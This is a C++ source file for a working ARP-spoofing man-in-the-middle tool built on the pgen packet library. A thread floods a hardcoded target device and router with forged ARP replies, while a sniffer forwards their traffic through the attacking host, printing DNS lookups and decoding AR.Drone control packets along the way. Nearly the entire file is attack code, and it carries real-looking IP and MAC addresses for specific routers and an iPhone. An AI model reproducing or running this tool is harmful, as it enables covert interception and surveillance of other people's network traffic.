#include <stdio.h>
#include <pgen.h>
#include <thread>



const char* dev = "en0";
ipaddr myip;

struct host{
	char ip[32];
	char mac[32];
};

/* nad11 mobile router */
//struct host router = {"192.168.179.1", "a2:12:42:17:d8:8f"};

/* buffalo router */
//struct host router = {"192.168.222.1", "74:03:bd:13:2c:a6"};

/* kaplan router */
struct host router = {"10.128.4.1", "00:00:0c:07:ac:01"};

/* iphone */
//struct host target = {"192.168.179.6", "f0:24:75:bf:8d:bf"};
struct host target = {"10.128.5.202", "f0:24:75:bf:8d:bf"};

/* buffalo usb ethernetl */
//struct host target = {"192.168.222.103", "cc:e1:d5:02:ea:71"};

/* mac wlan en0 */
//struct host target = {"192.168.222.106", "10.128.5.85"};
//struct host target = {"192.168.179.4", "80:e6:50:17:18:46"};

/* think wlan0 */
//struct host target = {"192.168.179.5", "60:57:18:e4:d3:e7"};

pgen_t* handle;
void mitm_attack(const char* ip1, const char* mac1, 
					const char* ip2, const char* mac2);
bool other_packet_filter(const u_char* packet, int len);


void filter(const u_char* packet, int len){
	pgen_unknown buf(packet, len);
	if(buf.isUDP && buf.portis(5556)){
		pgen_ardrone pack(packet, len);
		pack.DSUMMARY();
	}
}




bool myswitch(const u_char* packet, int len){
	if(other_packet_filter(packet, len) == false) return true;

	pgen_unknown un(packet, len);
	if(un.isUDP && un.portis(53)) {
		pgen_dns buf(packet, len);
		buf.summary();	
	}


	macaddr next_src;
	macaddr next_dst;
	next_src.setmacbydev(dev);
	pgen_ip ip(packet, len);
	
	if(ip.IP.dst == target.ip)	next_dst = target.mac;
	else						next_dst = router.mac;
	ip.ETH.src = next_src;
	ip.ETH.dst = next_dst;
	
	filter(packet, len);

	ip.send_handle(handle);
	return true;
}





int main(int argc, char** argv){
	handle = pgen_open(dev, NULL);
	if(handle == NULL){
		perror("pgen_open");
		return -1;
	}
	myip.setipbydev(dev);
	std::thread mitm(mitm_attack, target.ip, target.mac, router.ip, router.mac);
	sniff(handle, myswitch);
}




bool other_packet_filter(const u_char* packet, int len){
	ipaddr myip;
	myip.setipbydev(dev);

	pgen_unknown buf(packet, len);
	if(buf.isIP == false)	return false;
	if(buf.ipaddris(myip)) return false;

	return true;	
}




void mitm_attack(const char* ip1, const char* mac1, 
					const char* ip2, const char* mac2){
	pgen_arp pack_to_target1;
	pgen_arp pack_to_target2;

	pack_to_target1.ETH.src.setmacbydev(dev);
	pack_to_target1.ETH.dst = mac1;
	pack_to_target1.ARP.srcEth.setmacbydev(dev);
	pack_to_target1.ARP.srcIp  = ip2;
	pack_to_target1.ARP.dstEth = mac1;
	pack_to_target1.ARP.dstIp  = ip1;
	pack_to_target1.ARP.operation = 2;
	pack_to_target2.ETH.src.setmacbydev(dev);
	pack_to_target2.ETH.dst = mac2;
	pack_to_target2.ARP.srcEth.setmacbydev(dev);
	pack_to_target2.ARP.srcIp  = ip1;
	pack_to_target2.ARP.dstEth = mac2;
	pack_to_target2.ARP.dstIp  = ip2;
	pack_to_target2.ARP.operation = 2;

	for(int i=0; ; i++){
		pack_to_target1.send_handle(handle);
		pack_to_target2.send_handle(handle);
		sleep(1);
	}		
}
